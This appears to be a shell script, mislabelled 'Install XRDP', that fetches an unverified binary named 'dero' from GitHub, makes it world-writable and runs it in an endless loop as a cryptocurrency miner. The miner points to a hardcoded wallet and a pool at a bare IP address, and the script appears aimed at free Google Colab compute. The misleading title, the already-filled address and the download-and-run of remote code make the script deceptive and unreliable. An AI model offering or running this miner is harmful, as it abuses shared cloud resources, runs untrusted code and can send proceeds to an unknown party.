# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R dero

wget https://github.com/angkii/m/raw/main/dero
chmod 777 dero

#!/bin/bash
echo "Replace YOUR_ADDRESS to run the miner"
while :; do
    ./dero -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmzrc98wdfz0jfq5r2crc.sage -r 51.79.29.3:80 -p stratum;
    sleep 5;
done
